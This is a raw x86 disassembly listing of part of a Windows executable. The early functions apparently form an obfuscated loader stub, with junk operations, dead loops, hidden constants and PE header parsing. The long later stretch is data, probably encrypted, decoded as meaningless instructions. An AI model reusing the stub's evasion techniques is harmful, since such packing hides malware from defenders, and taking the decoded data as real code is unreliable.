  4028ba:	ret    0xc
  4028bd:	push   ebp
  4028be:	mov    ebp,esp
  4028c0:	push   ecx
  4028c1:	and    DWORD PTR ds:0x42d010,0x0
  4028cb:	jmp    0x4028de
  4028d0:	xor    eax,eax
  4028d2:	add    eax,DWORD PTR ds:0x42d010
  4028d8:	inc    eax
  4028d9:	mov    ds:0x42d010,eax
  4028de:	cmp    DWORD PTR ds:0x42d010,0x1c
  4028e5:	jae    0x402908
  4028eb:	cmp    DWORD PTR ds:0x42d010,0x24
  4028f2:	jne    0x402903
  4028f8:	push   0x42c010
  4028fd:	call   DWORD PTR ds:0x42e9ab
  402903:	jmp    0x4028d0
  402908:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40290f:	add    edx,0x297b
  402915:	mov    eax,DWORD PTR [ebp+0x8]
  402918:	movsx  eax,BYTE PTR [eax]
  40291b:	add    edx,edx
  40291d:	mov    edx,0x3272e0
  402922:	sbb    DWORD PTR ds:0x429014,0x3776
  40292c:	sub    eax,edx
  40292e:	mov    ecx,0x7510899
  402933:	xor    DWORD PTR ds:0x429014,0x42b000
  40293d:	xor    eax,ecx
  40293f:	mov    DWORD PTR ds:0x429008,0x73b1
  402949:	cmp    eax,0xf89c85f4
  40294e:	mov    DWORD PTR ds:0x42c014,0x53e4
  402958:	jne    0x402987
  40295e:	mov    eax,DWORD PTR [ebp+0x8]
  402961:	push   esi
  402962:	mov    esi,DWORD PTR [ebp+0x8]
  402965:	add    esi,DWORD PTR [eax+0x3c]
  402968:	mov    DWORD PTR [ebp+0x8],esi
  40296b:	mov    eax,DWORD PTR [ebp-0x4]
  40296e:	mov    esi,DWORD PTR [ebp+0x8]
  402971:	xor    eax,ecx
  402973:	add    eax,edx
  402975:	cmp    DWORD PTR [esi+0x54],eax
  402978:	pop    esi
  402979:	je     0x402987
  40297f:	mov    eax,DWORD PTR [ebp+0x8]
  402982:	jmp    0x40298e
  402987:	mov    eax,DWORD PTR [ebp-0x4]
  40298a:	xor    eax,ecx
  40298c:	add    eax,edx
  40298e:	leave  
  40298f:	ret    0x4
  402992:	push   ebp
  402993:	mov    ebp,esp
  402995:	sub    esp,0x40
  402998:	push   ebx
  402999:	adc    DWORD PTR ds:0x42d000,0x42b014
  4029a3:	push   esi
  4029a4:	push   edi
  4029a5:	lea    eax,[ebp-0x24]
  4029a8:	push   eax
  4029a9:	add    DWORD PTR ds:0x429028,0x429004
  4029b3:	lea    eax,[ebp-0x20]
  4029b6:	push   eax
  4029b7:	xor    DWORD PTR ds:0x42c00c,0x5e29
  4029c1:	call   DWORD PTR ds:0x42e9a7
  4029c7:	sub    DWORD PTR ds:0x42a018,0x7df1
  4029d1:	push   0x21
  4029d3:	push   0x434
  4029d8:	sbb    DWORD PTR ds:0x429000,0x54d2
  4029e2:	push   0x98678765
  4029e7:	sub    DWORD PTR ds:0x42d014,0x42c00c
  4029f1:	call   DWORD PTR ds:0x42e983
  4029f7:	xor    DWORD PTR ds:0x429000,edx
  4029fd:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  402a04:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  402a0b:	mov    eax,DWORD PTR [ebp-0x4]
  402a0e:	mov    esi,0x7510899
  402a13:	xor    eax,esi
  402a15:	mov    edi,DWORD PTR ds:0x42b01c
  402a1b:	adc    DWORD PTR ds:0x429010,edi
  402a21:	mov    edi,0x3272e0
  402a26:	add    eax,edi
  402a28:	dec    DWORD PTR ds:0x429000
  402a2e:	mov    DWORD PTR [ebp-0x1c],eax
  402a31:	mov    eax,DWORD PTR [ebp+0x14]
  402a34:	adc    DWORD PTR ds:0x42c000,0x42b014
  402a3e:	test   eax,eax
  402a40:	je     0x402a4e
  402a46:	mov    eax,DWORD PTR [ebp+0x14]
  402a49:	mov    eax,DWORD PTR [eax]
  402a4b:	mov    DWORD PTR [ebp-0x1c],eax
  402a4e:	xor    eax,eax
  402a50:	xor    eax,DWORD PTR ds:0x42901c
  402a56:	and    eax,DWORD PTR ds:0x42b000
  402a5c:	mov    ds:0x42901c,eax
  402a61:	mov    eax,DWORD PTR [ebp-0x4]
  402a64:	xor    eax,esi
  402a66:	adc    ebx,DWORD PTR ds:0x429024
  402a6c:	add    eax,edi
  402a6e:	mov    DWORD PTR [ebp-0x8],eax
  402a71:	sbb    ebx,DWORD PTR ds:0x42c008
  402a77:	mov    eax,DWORD PTR [ebp-0xc]
  402a7a:	mov    DWORD PTR ds:0x42b014,0x1d
  402a84:	cmp    DWORD PTR ds:0x42b014,0x0
  402a8b:	je     0x402aca
  402a91:	cmp    DWORD PTR ds:0x42b014,0x20
  402a98:	jne    0x402ab6
  402a9e:	push   0x3b9b
  402aa3:	push   DWORD PTR [ebp-0x24]
  402aa6:	push   0x42d018
  402aab:	push   0x5e20
  402ab0:	call   DWORD PTR ds:0x42e9af
  402ab6:	xor    ebx,ebx
  402ab8:	or     ebx,DWORD PTR ds:0x42b014
  402abe:	dec    ebx
  402abf:	mov    DWORD PTR ds:0x42b014,ebx
  402ac5:	jmp    0x402a84
  402aca:	xor    eax,esi
  402acc:	and    DWORD PTR ds:0x42a01c,0x0
  402ad6:	mov    ebx,DWORD PTR ds:0x42a01c
  402adc:	inc    ebx
  402add:	mov    DWORD PTR ds:0x42a01c,ebx
  402ae3:	cmp    DWORD PTR ds:0x42a01c,0xd
  402aea:	jne    0x402af6
  402af0:	call   DWORD PTR ds:0x42e9b3
  402af6:	cmp    DWORD PTR ds:0x42a01c,0xc
  402afd:	jne    0x402b10
  402b03:	mov    ebx,DWORD PTR ds:0x42a01c
  402b09:	inc    ebx
  402b0a:	mov    DWORD PTR ds:0x42a01c,ebx
  402b10:	cmp    DWORD PTR ds:0x42a01c,0x15
  402b17:	jb     0x402ad6
  402b1d:	or     DWORD PTR ds:0x42c004,edx
  402b23:	add    eax,edi
  402b25:	sub    DWORD PTR ds:0x42b008,ebx
  402b2b:	mov    DWORD PTR [ebp-0x2c],eax
  402b2e:	mov    eax,DWORD PTR [ebp-0x4]
  402b31:	xor    eax,esi
  402b33:	add    eax,edi
  402b35:	dec    ebx
  402b36:	mov    DWORD PTR [ebp-0x38],eax
  402b39:	mov    DWORD PTR ds:0x42a00c,0x11
  402b43:	cmp    DWORD PTR ds:0x42a00c,0x0
  402b4a:	je     0x402bcf
  402b50:	cmp    DWORD PTR ds:0x42a00c,0x1b
  402b57:	jne    0x402b7d
  402b5d:	push   DWORD PTR [ebp-0x28]
  402b60:	push   0x42a000
  402b65:	push   DWORD PTR [ebp-0x24]
  402b68:	push   0x6762
  402b6d:	push   0x632b
  402b72:	push   0x871c
  402b77:	call   DWORD PTR ds:0x42e9b7
  402b7d:	xor    ebx,ebx
  402b7f:	xor    ebx,DWORD PTR ds:0x42a00c
  402b85:	dec    ebx
  402b86:	mov    DWORD PTR ds:0x42a00c,ebx
  402b8c:	jmp    0x402b43
  402b91:	and    DWORD PTR ds:0x42d018,0x0
  402b9b:	xor    eax,eax
  402b9d:	xor    eax,DWORD PTR ds:0x42d018
  402ba3:	inc    eax
  402ba4:	mov    ds:0x42d018,eax
  402ba9:	cmp    DWORD PTR ds:0x42d018,0x2a
  402bb0:	jne    0x402bbc
  402bb6:	call   DWORD PTR ds:0x42e9bb
  402bbc:	cmp    DWORD PTR ds:0x42d018,0x1c
  402bc3:	jb     0x402b9b
  402bc9:	and    ebx,0x7bf
  402bcf:	mov    ebx,DWORD PTR [ebp-0x4]
  402bd2:	xor    ebx,esi
  402bd4:	adc    DWORD PTR ds:0x42d01c,0x429024
  402bde:	add    ebx,edi
  402be0:	xor    DWORD PTR ds:0x42d008,0x22f2
  402bea:	mov    eax,DWORD PTR [ebp-0x2c]
  402bed:	xor    DWORD PTR ds:0x42a008,0x42d00c
  402bf7:	sub    eax,edi
  402bf9:	lea    ecx,[ebx-0x3272e0]
  402bff:	adc    DWORD PTR ds:0x42c01c,0x429010
  402c09:	xor    eax,esi
  402c0b:	xor    ecx,esi
  402c0d:	cmp    ecx,eax
  402c0f:	mov    DWORD PTR ds:0x42a014,0x880
  402c19:	je     0x405220
  402c1f:	and    DWORD PTR ds:0x42d018,0x0
  402c29:	jmp    0x402c3c
  402c2e:	xor    eax,eax
  402c30:	or     eax,DWORD PTR ds:0x42d018
  402c36:	inc    eax
  402c37:	mov    ds:0x42d018,eax
  402c3c:	cmp    DWORD PTR ds:0x42d018,0x1f
  402c43:	jae    0x402c7e
  402c49:	cmp    DWORD PTR ds:0x42d018,0x26
  402c50:	jne    0x402c69
  402c56:	push   0x847e
  402c5b:	push   0x42901c
  402c60:	push   DWORD PTR [ebp-0x20]
  402c63:	call   DWORD PTR ds:0x42e9bf
  402c69:	jmp    0x402c2e
  402c6e:	mov    eax,ds:0x42b010
  402c73:	and    eax,DWORD PTR ds:0x429010
  402c79:	mov    ds:0x42b010,eax
  402c7e:	mov    eax,DWORD PTR [ebp-0x4]
  402c81:	xor    eax,esi
  402c83:	mov    DWORD PTR ds:0x42c008,0x7a4b
  402c8d:	add    eax,edi
  402c8f:	cmp    ebx,eax
  402c91:	mov    DWORD PTR ds:0x42b000,0x3723
  402c9b:	jne    0x405184
  402ca1:	push   DWORD PTR [ebp+0x8]
  402ca4:	neg    DWORD PTR ds:0x42d018
  402caa:	call   0x4028bd
  402caf:	movzx  ecx,BYTE PTR ds:0x42c000
  402cb6:	xor    DWORD PTR ds:0x429000,ecx
  402cbc:	mov    DWORD PTR [ebp-0x14],eax
  402cbf:	sbb    eax,0x7bdb
  402cc4:	mov    eax,DWORD PTR [ebp-0x4]
  402cc7:	mov    ecx,DWORD PTR [ebp-0x14]
  402cca:	sbb    DWORD PTR ds:0x42b00c,0x398d
  402cd4:	xor    eax,esi
  402cd6:	add    eax,edi
  402cd8:	mov    DWORD PTR ds:0x42a018,0x3718
  402ce2:	jmp    0x405039
  402ce7:	dec    ecx
  402ce8:	je     0x402ca4
  402cea:	dec    ebp
  402ceb:	stos   DWORD PTR es:[edi],eax
  402cec:	cmp    ecx,DWORD PTR [ebp+0x6a681074]
  402cf2:	adc    eax,0x41b73ab1
  402cf7:	jp     0x402d73
  402cf9:	jp     0x402d75
  402cfb:	xor    BYTE PTR [edi+0x7a],bl
  402cfe:	jp     0x402d11
  402d00:	sub    BYTE PTR [edi],dl
  402d02:	cmp    eax,0x2f1b2115
  402d07:	popa   
  402d08:	xor    al,0x65
  402d0a:	pushw  ds
  402d0c:	arpl   WORD PTR [edx+0x6a],bp
  402d0f:	imul   esi,DWORD PTR [edx],0x6cfdd8c1
  402d15:	inc    esp
  402d16:	imul   edi,DWORD PTR [ebp+0x5b],0xffffffac
  402d1a:	jl     0x402d85
  402d1c:	push   ebp
  402d1d:	iret   
  402d1e:	pop    ecx
  402d1f:	dec    edx
  402d20:	cmp    al,0x88
  402d22:	cli    
  402d23:	xchg   DWORD PTR [esi+0x57],esi
  402d26:	dec    ecx
  402d27:	jg     0x402d60
  402d29:	mov    WORD PTR [esi+0x3ba2bc7f],fs
  402d2f:	sub    bh,bh
  402d31:	data16 fdivr st,st(2)
  402d34:	push   ebx
  402d35:	jg     0x402d55
  402d37:	jmp    0xe9faf671
  402d3c:	xchg   DWORD PTR [ebx],edx
  402d3e:	fimul  WORD PTR [ebx-0x54aaf0db]
  402d44:	mov    al,al
  402d46:	imul   DWORD PTR [ecx-0x27]
  402d49:	add    al,dl
  402d4b:	push   cs
  402d4c:	cli    
  402d4d:	es adc al,0x44
  402d50:	or     BYTE PTR [esi],ah
  402d52:	imul   esp,DWORD PTR [ebp+esi*4-0x51],0x13
  402d57:	pop    ebp
  402d58:	add    DWORD PTR [esi+0x2b45e5ff],esp
  402d5e:	jo     0x402d92
  402d60:	les    ebx,FWORD PTR [ebx-0xb]
  402d63:	sbb    bh,dl
  402d65:	je     0x402d24
  402d67:	arpl   cx,bx
  402d69:	xchg   esp,eax
  402d6a:	pop    edi
  402d6b:	mov    edi,DWORD PTR [ebp+0x4d821007]
  402d71:	repz sahf 
  402d73:	cmp    BYTE PTR [edx+0x73],dh
  402d76:	or     ebx,edx
  402d78:	sub    DWORD PTR [edx-0x77],edx
  402d7b:	xor    BYTE PTR [ebx],dh
  402d7d:	push   eax
  402d7e:	jecxz  0x402d4f
  402d80:	mov    ah,BYTE PTR ds:0xc8b7cc85
  402d86:	test   BYTE PTR [ebp-0x20],ch
  402d89:	inc    ecx
  402d8a:	push   edx
  402d8b:	dec    eax
  402d8c:	or     BYTE PTR [esi],bh
  402d8e:	repz add ebp,DWORD PTR ss:[ecx+0x4ca7ca4b]
  402d96:	fadd   QWORD PTR [eax]
  402d98:	push   esi
  402d99:	stc    
  402d9a:	push   edx
  402d9b:	push   esi
  402d9c:	mov    eax,ds:0xf4bf64f5
  402da1:	inc    edx
  402da2:	pop    ds
  402da3:	mov    ecx,0xbc5c8d84
  402da8:	sub    al,0xae
  402daa:	xor    DWORD PTR [edi+0x53],esp
  402dad:	aas    
  402dae:	int    0x82
  402db0:	call   0xfa44ff79
  402db5:	mov    cl,0x89
  402db7:	adc    BYTE PTR [eax],dh
  402db9:	mov    ecx,0xfa998157
  402dbe:	(bad)  
  402dbf:	add    al,BYTE PTR [edi+0x15c691e1]
  402dc5:	mov    eax,0x3388b19
  402dca:	and    al,0xcb
  402dcc:	adc    al,BYTE PTR [esp+edx*1-0x3a]
  402dd0:	xchg   esp,eax
  402dd1:	ins    DWORD PTR es:[edi],dx
  402dd2:	pop    eax
  402dd3:	out    0x22,eax
  402dd5:	push   0x1b
  402dd7:	mov    bl,0x35
  402dd9:	pop    ebx
  402dda:	je     0x402dd9
  402ddc:	add    BYTE PTR [eax+eax*4-0x1c67c522],cl
  402de3:	pop    eax
  402de4:	xor    BYTE PTR [edi],ah
  402de6:	popa   
  402de7:	cs pop es
  402de9:	sub    edi,0x48afd7ce
  402def:	pop    ds
  402df0:	and    edi,DWORD PTR [edx]
  402df2:	imul   ebp,DWORD PTR [esi+edx*1-0x5309a130],0x37
  402dfa:	mov    al,0xa6
  402dfc:	jbe    0x402e3f
  402dfe:	and    al,al
  402e00:	out    dx,al
  402e01:	sbb    BYTE PTR [ecx-0x41],ah
  402e04:	dec    ecx
  402e05:	bound  edx,QWORD PTR [eax]
  402e07:	rol    DWORD PTR [eax+0x2e],cl
  402e0a:	(bad)  
  402e0c:	retf   
  402e0d:	cwde   
  402e0e:	mov    cl,0xdb
  402e10:	xor    BYTE PTR es:[esi+0x3bf19274],cl
  402e17:	jo     0x402e8a
  402e19:	scas   eax,DWORD PTR es:[edi]
  402e1a:	mov    DWORD PTR [ecx],edx
  402e1c:	imul   eax,DWORD PTR [eax+0x26],0xab4fff90
  402e23:	loope  0x402e6e
  402e25:	ficomp WORD PTR [esi+ecx*1]
  402e28:	add    edi,ebx
  402e2a:	loop   0x402e15
  402e2c:	or     eax,0x38a94848
  402e31:	dec    edx
  402e32:	popf   
  402e33:	nop
  402e34:	aam    0x77
  402e36:	inc    ecx
  402e37:	stos   BYTE PTR es:[edi],al
  402e38:	pop    es
  402e39:	push   esi
  402e3a:	or     edi,ebx
  402e3c:	int3   
  402e3d:	or     al,0x59
  402e3f:	jmp    0xcf18b2e
  402e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e45:	(bad)  [eax+0x6e]
  402e48:	rep outs dx,DWORD PTR ds:[esi]
  402e4a:	or     al,BYTE PTR es:[ebx+0x2969764b]
  402e51:	outs   dx,BYTE PTR ds:[esi]
  402e52:	in     al,dx
  402e53:	mov    BYTE PTR ds:0xb1e79bee,dl
  402e59:	jp     0x402dee
  402e5b:	dec    ecx
  402e5c:	dec    esi
  402e5d:	dec    esi
  402e5e:	sbb    DWORD PTR ds:0x28d953b2,ebp
  402e64:	ret    
  402e65:	cmp    al,0x90
  402e67:	sub    al,0x14
  402e69:	or     bl,BYTE PTR [esi+0x79]
  402e6c:	adc    DWORD PTR [edx+0xb],esi
  402e6f:	xor    BYTE PTR [ebx-0x6af868b1],0x99
  402e76:	xor    ch,bl
  402e78:	pop    edi
  402e79:	in     eax,0xe5
  402e7b:	xchg   esp,eax
  402e7c:	dec    edi
  402e7d:	xchg   edi,ebp
  402e7f:	dec    ecx
  402e80:	mov    edx,0x6fac9ada
  402e85:	mov    ebx,0xe4df16b5
  402e8a:	aad    0xae
  402e8c:	mov    ebx,0x1a3b82ae
  402e91:	not    ebp
  402e93:	jnp    0x402e74
  402e95:	xchg   ebp,eax
  402e96:	xchg   ebx,eax
  402e97:	pop    esi
  402e98:	or     ecx,edi
  402e9a:	xor    al,0x58
  402e9c:	(bad)  
  402e9d:	sar    bl,cl
  402e9f:	cmp    al,0x99
  402ea1:	aaa    
  402ea2:	and    eax,0xa898e9ad
  402ea7:	fdivr  QWORD PTR [ecx-0x26d33291]
  402ead:	push   cs
  402eae:	mov    eax,ebp
  402eb0:	icebp  
  402eb1:	int3   
  402eb2:	sbb    WORD PTR [edx-0x90ff923],bp
  402eb9:	jns    0x402ef8
  402ebb:	inc    ecx
  402ebc:	xchg   BYTE PTR [edx+ecx*8-0x5595c187],al
  402ec3:	test   BYTE PTR [esi-0x60],bl
  402ec6:	aam    0xef
  402ec8:	outs   dx,BYTE PTR ds:[esi]
  402ec9:	cmp    dh,BYTE PTR [ecx+0xfbda840]
  402ecf:	lods   al,BYTE PTR ds:[esi]
  402ed0:	lock je 0x402e7a
  402ed3:	call   0xae9575c9
  402ed8:	test   DWORD PTR [eax],edx
  402eda:	out    dx,eax
  402edb:	daa    
  402edc:	jne    0x402ef6
  402ede:	or     al,dh
  402ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ee1:	push   edx
  402ee2:	cld    
  402ee3:	loope  0x402ebb
  402ee5:	in     al,dx
  402ee6:	enter  0x8c73,0x99
  402eea:	daa    
  402eeb:	inc    ebp
  402eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eed:	jg     0x402e84
  402eef:	inc    edi
  402ef0:	loope  0x402f17
  402ef2:	xchg   ebx,eax
  402ef3:	fucomi st,st(4)
  402ef5:	pop    ds
  402ef6:	mov    esi,0x25311cfa
  402efb:	dec    ebx
  402efc:	(bad)  [ebp+0x2c230300]
  402f02:	jl     0x402ead
  402f04:	sub    cl,bh
  402f06:	repnz mov ds:0xb7835133,al
  402f0d:	test   eax,0x5c747dd5
  402f12:	imul   edx,DWORD PTR [esi],0xffffffa9
  402f15:	mov    cl,0xd6
  402f17:	mov    esp,0x670e65fc
  402f1c:	fidiv  WORD PTR [edx]
  402f1e:	push   cs
  402f1f:	(bad)
  402f23:	pop    es
  402f24:	(bad)  
  402f25:	lahf   
  402f26:	sub    BYTE PTR [ebx],al
  402f28:	xlat   BYTE PTR ds:[ebx]
  402f29:	add    al,0x59
  402f2b:	test   dh,cl
  402f2d:	enter  0x5418,0x9b
  402f31:	pop    ss
  402f32:	inc    ebx
  402f33:	adc    ch,BYTE PTR [esi]
  402f35:	bound  edi,QWORD PTR [esi+0x59d38efd]
  402f3b:	mov    bl,0x2b
  402f3d:	mov    dh,0xb2
  402f3f:	xchg   esp,eax
  402f40:	pop    ecx
  402f41:	dec    edx
  402f42:	aaa    
  402f43:	or     BYTE PTR [ebp+0x22976645],al
  402f49:	sbb    eax,0xa68871c7
  402f4e:	push   ecx
  402f4f:	rol    DWORD PTR [ecx-0x7c],cl
  402f52:	(bad)  
  402f53:	test   esp,0xd67d16d9
  402f59:	pop    ds
  402f5a:	test   al,0xeb
  402f5c:	adc    bh,BYTE PTR [eax+0x2d]
  402f5f:	and    al,0x64
  402f61:	jae    0x402f86
  402f63:	and    dh,dh
  402f65:	ss arpl bp,di
  402f68:	pop    edi
  402f69:	shl    edi,1
  402f6b:	(bad)  [eax]
  402f6d:	inc    esi
  402f6e:	(bad)  
  402f6f:	or     eax,0xbe59e34d
  402f74:	sbb    DWORD PTR [esi+ebx*1-0x1c],esp
  402f78:	xchg   ebp,eax
  402f79:	or     al,0xdb
  402f7b:	enter  0x8b36,0x9
  402f7f:	scas   al,BYTE PTR es:[edi]
  402f80:	jo     0x402fe1
  402f82:	ins    DWORD PTR es:[edi],dx
  402f83:	mov    bh,0xc1
  402f85:	scas   eax,DWORD PTR es:[edi]
  402f86:	xchg   DWORD PTR [eax],edi
  402f88:	int    0xd3
  402f8a:	inc    ebx
  402f8b:	call   DWORD PTR [ebx-0x64c727de]
  402f91:	inc    ebx
  402f92:	popa   
  402f93:	cli    
  402f94:	test   al,0x8
  402f96:	in     al,0xa0
  402f98:	outs   dx,DWORD PTR ds:[esi]
  402f99:	in     eax,dx
  402f9a:	push   ds
  402f9b:	lea    ebx,[ebx+0xe]
  402f9e:	int3   
  402f9f:	jno    0x402fcc
  402fa1:	sbb    ecx,DWORD PTR [ebp+0x5a78b6ab]
  402fa7:	rol    dh,1
  402fa9:	dec    eax
  402faa:	or     DWORD PTR [eax-0x3a],edi
  402fad:	loop   0x402f62
  402faf:	sbb    BYTE PTR [ebp-0x7e272cf5],cl
  402fb5:	jecxz  0x402f66
  402fb7:	cld    
  402fb8:	ins    DWORD PTR es:[edi],dx
  402fb9:	test   DWORD PTR [ebx-0x235033f1],ebp
  402fbf:	gs mov ecx,0xeffe0d50
  402fc5:	cmp    esi,ebx
  402fc7:	mov    ebx,0xf2298803
  402fcc:	(bad)  
  402fcd:	test   eax,0xdb2b676a
  402fd2:	rcl    esp,0x1a
  402fd5:	and    al,0x4
  402fd7:	jns    0x402f94
  402fd9:	imul   ebp,DWORD PTR [eax-0x1c965ae8],0x5c
  402fe0:	lea    esi,[edi]
  402fe2:	addr16 call 0x99d8:0x92b88a3d
  402fea:	out    dx,eax
  402feb:	cs pop ecx
  402fed:	cmp    edi,esp
  402fef:	imul   esi,eax,0x53f8ca19
  402ff5:	(bad)  
  402ff6:	dec    ebx
  402ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ff8:	inc    esi
  402ff9:	sub    dl,BYTE PTR [ebp+esi*2+0x2f8395a4]
  403000:	clc    
  403001:	and    edi,ebp
  403003:	cmp    DWORD PTR [ebp-0x3eed432b],ecx
  403009:	cld    
  40300a:	ins    BYTE PTR es:[edi],dx
  40300b:	(bad)  
  40300c:	cmp    ebp,ebp
  40300e:	jp     0x40304f
  403010:	dec    esp
  403011:	jb     0x403000
  403013:	adc    eax,0x2ab9798d
  403018:	retf   0x320a
  40301b:	mov    ds:0x930563c9,eax
  403020:	mov    dl,0xcd
  403022:	pop    ss
  403023:	nop
  403024:	pop    ebp
  403025:	add    eax,0xb2b4df21
  40302a:	cs test al,0x36
  40302d:	(bad)  
  40302e:	cdq    
  40302f:	retf   0x510a
  403032:	jns    0x40302a
  403034:	xchg   BYTE PTR [edx+ecx*4],bh
  403037:	fistp  DWORD PTR [ecx]
  403039:	xchg   ebp,eax
  40303a:	mov    dh,0x65
  40303c:	mov    ch,0x42
  40303e:	pop    es
  40303f:	data16 int 0x17
  403042:	adc    al,0x7e
  403044:	jle    0x403029
  403046:	cs repnz in eax,0xc3
  40304a:	mov    al,0x55
  40304c:	sti    
  40304d:	test   dl,0x9b
  403050:	das    
  403051:	test   DWORD PTR [ecx+0x61],ebx
  403054:	pop    edx
  403055:	aad    0xab
  403057:	ja     0x40303a
  403059:	aad    0xb3
  40305b:	sbb    al,0x13
  40305d:	xchg   DWORD PTR [ebp+ebp*8-0x17d02102],ebx
  403064:	lds    ebp,FWORD PTR [eax*2+0x3409b3d9]
  40306b:	or     BYTE PTR [ecx+0x20],dl
  40306e:	sub    esi,esp
  403070:	fimul  DWORD PTR [esi]
  403072:	sub    BYTE PTR [eax],al
  403074:	jp     0x403010
  403076:	idiv   DWORD PTR [ecx]
  403078:	or     al,0xd4
  40307a:	jne    0x403067
  40307c:	repnz and BYTE PTR [edi+edi*8],ch
  403080:	out    dx,al
  403081:	add    edi,DWORD PTR [ebp-0x6e]
  403084:	push   edx
  403085:	fcomp  QWORD PTR ds:0x7169eeb9
  40308b:	in     eax,dx
  40308c:	jecxz  0x40310c
  40308e:	je     0x4030d6
  403090:	xor    bh,BYTE PTR [edi]
  403092:	test   al,0x34
  403094:	push   ss
  403095:	mov    ch,0xce
  403097:	jbe    0x4030bb
  403099:	dec    esi
  40309a:	mov    BYTE PTR [esi+0x7b],bh
  40309d:	in     al,0xc7
  40309f:	dec    esi
  4030a0:	aaa    
  4030a1:	loope  0x403120
  4030a3:	cmp    ah,al
  4030a5:	jmp    0x6b0d2895
  4030aa:	inc    ebp
  4030ab:	ins    BYTE PTR es:[edi],dx
  4030ac:	or     BYTE PTR [ebp-0x59c5b365],al
  4030b2:	bnd call 0x942f9201
  4030b8:	sbb    al,0x7a
  4030ba:	fisttp QWORD PTR [ebp+0x14]
  4030bd:	call   0x56ada5f6
  4030c2:	add    al,0x0
  4030c4:	outs   dx,DWORD PTR ds:[esi]
  4030c5:	adc    eax,0x95c360f6
  4030ca:	dec    ecx
  4030cb:	push   ebp
  4030cc:	and    ecx,0x77
  4030cf:	xor    eax,0x360dbb98
  4030d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030d5:	xor    al,0xf8
  4030d7:	(bad)  
  4030d8:	scas   al,BYTE PTR es:[edi]
  4030d9:	out    0x65,eax
  4030db:	jg     0x4030ad
  4030dd:	(bad)  
  4030de:	in     al,dx
  4030df:	fcomp  QWORD PTR [edi]
  4030e1:	shl    DWORD PTR [edi+0x2961116a],0x2b
  4030e8:	adc    al,0x71
  4030ea:	frstor [ebp+ebp*2-0x18]
  4030ee:	pop    esi
  4030ef:	cmp    BYTE PTR [eax],bl
  4030f1:	sbb    ecx,ecx
  4030f3:	dec    edx
  4030f4:	cwde   
  4030f5:	xchg   esp,eax
  4030f6:	daa    
  4030f7:	je     0x4030fe
  4030f9:	jmp    edi
  4030fb:	loope  0x40309c
  4030fd:	inc    edi
  4030fe:	mov    al,ds:0xfc645a7d
  403103:	pop    es
  403104:	aas    
  403105:	leave  
  403106:	sar    BYTE PTR [ecx-0xdcf786a],0x44
  40310d:	mov    bl,0x5c
  40310f:	mov    ds:0x15096f8a,al
  403114:	inc    ecx
  403115:	xor    eax,0xdf7d2b63
  40311a:	xor    al,0x93
  40311c:	retf   
  40311d:	push   0xe217ae83
  403122:	inc    ebx
  403123:	mov    al,ds:0x9356f087
  403128:	mov    al,0x36
  40312a:	xchg   BYTE PTR [esi],dh
  40312c:	jg     0x40314f
  40312e:	jb     0x4030da
  403130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403131:	sbb    esi,DWORD PTR [esi+0x5c]
  403134:	add    cl,BYTE PTR [edi+0x1d07f9e2]
  40313a:	add    bl,BYTE PTR [ebx+0x3dcd3222]
  403140:	dec    DWORD PTR [edx]
  403142:	add    eax,0x12
  403145:	adc    DWORD PTR [ecx],eax
  403147:	leave  
  403148:	jecxz  0x403124
  40314a:	inc    esi
  40314b:	cmc    
  40314c:	aas    
  40314d:	retf   0x77e8
  403150:	(bad)  
  403151:	push   ecx
  403152:	rol    BYTE PTR ds:0xe37f34a4,0x93
  403159:	inc    edx
  40315a:	adc    DWORD PTR [esi],eax
  40315c:	mov    ebp,0x9ba39682
  403161:	(bad)  
  403162:	mov    edx,0xc8d79024
  403167:	pop    edi
  403168:	fmul   st(5),st
  40316a:	ret    0xa675
  40316d:	sub    eax,0x5d6fb6fe
  403172:	push   cs
  403173:	stc    
  403174:	dec    edx
  403175:	cmp    dl,BYTE PTR [esi-0x7b]
  403178:	cmp    eax,0x529ee376
  40317d:	fst    DWORD PTR [ecx+0xfc2ea2a]
  403183:	push   ds
  403184:	repnz and esp,DWORD PTR [edx+0x1009eb13]
  40318b:	mov    ebx,0x87fd67d
  403190:	(bad)  [ecx+0xc]
  403193:	adc    BYTE PTR [edi-0x2a],ch
  403196:	inc    esp
  403197:	mov    ch,0x9b
  403199:	shr    BYTE PTR [esi],1
  40319b:	(bad)  [ebp+0x392d726b]
  4031a1:	cs dec ebx
  4031a3:	inc    ebp
  4031a4:	inc    ecx
  4031a5:	push   0xffffffcf
  4031a7:	in     eax,dx
  4031a8:	clc    
  4031a9:	sub    esi,esi
  4031ab:	fwait
  4031ac:	in     eax,dx
  4031ad:	jmp    0xe971:0x8966a746
  4031b4:	xchg   esi,eax
  4031b5:	ss sti 
  4031b7:	into   
  4031b8:	ror    DWORD PTR [ebp+0x14],1
  4031bb:	leave  
  4031bc:	cld    
  4031bd:	jge    0x40317c
  4031bf:	cmp    DWORD PTR [edx-0x53ba527b],esp
  4031c5:	lods   al,BYTE PTR ds:[esi]
  4031c6:	das    
  4031c7:	mov    bl,0xee
  4031c9:	loopne 0x40318c
  4031cb:	fiadd  WORD PTR [esi]
  4031cd:	mov    bh,0x72
  4031cf:	out    dx,eax
  4031d0:	pushaw 
  4031d2:	pop    ecx
  4031d3:	daa    
  4031d4:	sub    esi,edx
  4031d6:	out    dx,eax
  4031d7:	aam    0x3c
  4031d9:	xor    BYTE PTR [ebx+0x30],ah
  4031dc:	jmp    DWORD PTR [esi-0x2e374df6]
  4031e2:	fst    QWORD PTR [ecx+0x12]
  4031e5:	dec    ebx
  4031e6:	mov    ch,bl
  4031e8:	push   edi
  4031e9:	mov    al,cl
  4031eb:	and    eax,0xafb9ad3d
  4031f0:	and    dh,dh
  4031f2:	sahf   
  4031f3:	mov    eax,ds:0x597450c2
  4031f8:	or     esp,DWORD PTR [ecx-0x60748073]
  4031fe:	dec    esi
  4031ff:	je     0x403219
  403201:	dec    ebp
  403202:	jbe    0x40326b
  403204:	(bad)  
  403205:	cld    
  403206:	jge    0x40324b
  403208:	inc    eax
  403209:	cs sbb al,0x23
  40320c:	adc    ah,BYTE PTR [edi]
  40320e:	pushaw 
  403210:	dec    esi
  403211:	fwait
